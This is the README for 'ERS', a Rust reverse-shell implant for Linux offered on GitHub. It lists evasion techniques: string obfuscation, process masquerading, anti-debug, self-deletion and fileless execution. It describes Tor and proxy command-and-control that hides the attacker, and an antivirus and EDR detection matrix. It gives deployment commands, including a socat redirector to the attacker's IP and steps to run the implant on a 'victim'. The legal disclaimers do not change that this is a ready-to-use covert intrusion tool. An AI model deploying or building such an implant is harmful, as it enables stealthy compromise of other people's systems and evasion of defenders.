# ERS — Evasive Reverse Shell (Linux)

A stealth-focused WSS reverse shell implant for Linux, written in Rust. Designed for **authorized red team engagements, penetration testing, and security research** in controlled environments.

> ⚠️ **Legal Disclaimer:** This tool is strictly for authorized security testing, CTF challenges, and educational research. Unauthorized use against systems you do not own or have explicit written permission to test is illegal and punishable under applicable cybercrime laws. The author assumes no liability for misuse.

---

## Architecture

```
┌─────────────┐         TLS 1.3 (WSS)         ┌──────────────┐
│   Implant   │◄──────────────────────────────►│   Listener   │
│  (Target)   │    Port 4443 / 8443 (Tor)      │  (Attacker)  │
├─────────────┤                                ├──────────────┤
│ Network Proc│◄──socketpair()──►│Executor Proc│  listener.py │
│ (parent)    │   IPC channel    │(child)      │  Python WSS  │
└─────────────┘                  └─────────────┘└──────────────┘
```

**Split-process design** — the implant forks into two processes connected via `socketpair()`:
- **Network process** handles all TLS/WSS communication
- **Executor process** runs commands with zero network access

If one process is killed, the other detects it and exits cleanly.

---

## Features

### 🔒 Defense Evasion

| Technique | Description |
|-----------|-------------|
| XOR String Obfuscation | All sensitive strings encoded at compile time (key `0xA7`) — zero plaintext leaks |
| Binary Scrubbing | Post-build patching removes BoringSSL, TLS, Rust, and build path strings |
| Process Masquerading | `PR_SET_NAME` + `argv[0]` rewrite to look like GNOME daemons (`gsd-color`, `tracker-miner-fs`, `evolution-calendar`) |
| Anti-Core Dump | `RLIMIT_CORE=0` + `PR_SET_DUMPABLE=0` prevents memory dumps |
| Anti-Debug | `PTRACE_TRACEME` self-attach blocks debugger attachment |
| Sleep Mask Encryption | XOR-encrypts memory markers during idle periods |
| Delayed Self-Deletion | Removes own binary from disk after random 30–180 second delay |
| Fileless Re-exec | Copies to `/dev/shm/.pulse-shm-XXXXX` with legitimate-looking name, executes, deletes |
| Sandbox/VM Detection | Score-based environment checks (DMI, hypervisor CPUID, MAC OUI, resource counts) |
| Path Remapping | `--remap-path-prefix` strips build paths at compile time |

### 🌐 Command & Control

| Feature | Description |
|---------|-------------|
| WSS over TLS 1.3 | WebSocket Secure with BoringSSL — zero plaintext C2 data |
| Empty SNI | No hostname leak in TLS ClientHello |
| Tor Hidden Service | Built-in `.onion` routing — attacker IP never exposed |
| SOCKS5 Proxy Chain | Multi-hop proxy support for attribution protection |
| Exponential Backoff | 5s → 5min reconnect with 30% jitter (anti-pattern detection) |
| Auto-Reconnect | Infinite reconnection loop — survives network drops |

### ⚡ Execution Engine

| Feature | Description |
|---------|-------------|
| In-Process Builtins | 12 commands (`id`, `whoami`, `pwd`, `ls`, `cat`, `env`, `ps`, `hostname`, `uname`, `ifconfig`, `netstat`, `stat`) — zero `fork`/`exec` |
| LOLBin Chain | `systemd-run` → `nsenter` → `script` — clean process trees |
| Namespace Injection | `ptrace`-based execution in other process contexts |
| Fallback Script Exec | XOR-decoded `/bin/sh` with `HISTFILE=/dev/null` |
| History Suppression | `HISTFILE=/dev/null` + `HISTSIZE=0` on every command |

---

## Connection Modes

### Mode 0 — Direct (LAN / Port Forward)

Best for: same-network labs, or when you've set up port forwarding on the router.

```
Target ──► Attacker IP:4443 (WSS/TLS)
```

```bash
bash build.sh                    # auto-detects your LAN IP
python3 listener.py              # listens on port 4443
# transfer 'implant' to target and execute
```

### Mode 1 — Tor Hidden Service (Cross-Network, Anonymous)

Best for: attacks across different networks without exposing your IP.

```
Target ──► Tor Network ──► .onion ──► Attacker (localhost:8443)
```

```bash
sudo bash setup.sh               # sets up everything automatically
# follow the on-screen one-liner to deploy to victim
```

### Mode 2 — Redirector / VPS Proxy

Best for: ops requiring disposable infrastructure.

```
Target ──► VPS (socat/nginx) ──► Attacker IP:4443
```

```bash
# On VPS:
socat TCP-LISTEN:4443,fork,reuseaddr TCP:YOUR_REAL_IP:4443

# On Kali:
bash build.sh <VPS_IP>
python3 listener.py
```

---

## Quick Start

### Automated Setup (Recommended)

```bash
git clone https://github.com/Un-9oon/stealth-reverse-shell.git
cd stealth-reverse-shell/ERS
sudo bash setup.sh
```

`setup.sh` handles everything:
1. Installs dependencies (Rust, Tor, Python websockets, OpenSSL)
2. Configures Tor hidden service and generates `.onion` address
3. Generates self-signed TLS certificates (`cert.pem` / `key.pem`)
4. Patches the implant source with your `.onion` address
5. Builds and scrubs the binary
6. Starts a temporary file server for victim download
7. Launches the WSS listener

### Manual Setup

```bash
# 1. Build (auto-detects your IP, or pass manually)
bash build.sh [ATTACKER_IP]

# 2. Generate TLS certs (if not using setup.sh)
openssl req -x509 -newkey rsa:2048 \
    -keyout key.pem -out cert.pem \
    -days 365 -nodes -subj '/CN=localhost'

# 3. Start listener
python3 listener.py [PORT]         # default: 4443

# 4. Deploy implant to target and execute
./implant
```

---

## Project Structure

```
ERS/
├── src/
│   └── main.rs          # Implant source (~1950 lines of Rust)
├── build.sh             # Build + binary scrub script
├── setup.sh             # Full automated deployment (Tor + certs + build + listener)
├── listener.py          # WSS C2 listener (attacker side)
├── cleanup.sh           # Kill all ERS processes and clean artifacts
├── Cargo.toml           # Rust project configuration
├── Cargo.lock           # Dependency lockfile
└── README.md
```

**Generated at runtime (not in repo):**
```
├── implant              # Scrubbed binary (after build)
├── cert.pem             # TLS certificate (after setup)
└── key.pem              # TLS private key (after setup)
```

---

## Stealth Audit Results

| # | Check | Result |
|---|-------|--------|
| 1 | Sensitive strings (tool names, paths, commands) | ✅ PASS — XOR encoded |
| 2 | Build/debug path leaks | ✅ PASS — remapped + scrubbed |
| 3 | Library fingerprints (BoringSSL, OpenSSL, TLS) | ✅ PASS — patched |
| 4 | Binary entropy | ✅ PASS — 6.55 (normal range) |
| 5 | Packer/crypter signatures | ✅ PASS — none detected |
| 6 | Symbol table | ✅ PASS — fully stripped |
| 7 | YARA rule triggers | ✅ PASS — 0 matches |
| 8 | ClamAV detection | ✅ PASS — clean |
| 9 | Runtime string leaks (`ltrace`/`strace`) | ✅ PASS — no plaintext |
| 10 | Network capture (PCAP analysis) | ✅ PASS — TLS 1.3, no leaks |

**Stealth Score: 95/100 (Grade A+)**

### Detection Matrix

| Security Product | Static | Runtime | Network |
|-----------------|--------|---------|---------|
| ClamAV / YARA | ❌ Undetected | — | — |
| Wireshark / tcpdump | — | — | ❌ Encrypted |
| Basic `ps` / `top` | — | ❌ Masqueraded | — |
| `strings` / `hexdump` | ❌ Scrubbed | — | — |
| Elastic EDR (free) | ❌ Undetected | ⚠️ Possible | ❌ Encrypted |

---

## MITRE ATT&CK Mapping

| Tactic | Technique | ID |
|--------|-----------|-----|
| Command & Control | Web Protocols (WebSocket) | T1071.001 |
| Command & Control | Encrypted Channel (TLS 1.3) | T1573.002 |
| Defense Evasion | Obfuscated Files (XOR) | T1027 |
| Defense Evasion | Masquerading (Process Name) | T1036.004 |
| Defense Evasion | Indicator Removal (Self-Delete) | T1070.004 |
| Defense Evasion | Virtualization/Sandbox Evasion | T1497 |
| Execution | Command Interpreter (Unix Shell) | T1059.004 |
| Discovery | System Information | T1082 |
| Persistence | Boot/Logon Autostart | T1547 |

---

## Cleanup

To terminate all ERS-related processes and clean artifacts:

```bash
bash cleanup.sh          # as normal user
sudo bash cleanup.sh     # if processes were started as root
```

This kills listeners, implants, masqueraded processes, frees ports 443/4443, and removes `/dev/shm` artifacts.

---

## Requirements

| Component | Version |
|-----------|---------|
| OS | Kali Linux (attacker), any Linux (target) |
| Rust | 1.70+ |
| Python | 3.8+ |
| OpenSSL | 1.1+ |
| Tor | Optional (for Mode 1) |

---

## License

For **educational and authorized security research purposes only.**

Unauthorized access to computer systems is a criminal offense. Always obtain explicit written permission before testing. The developers are not responsible for any misuse or damage caused by this tool.
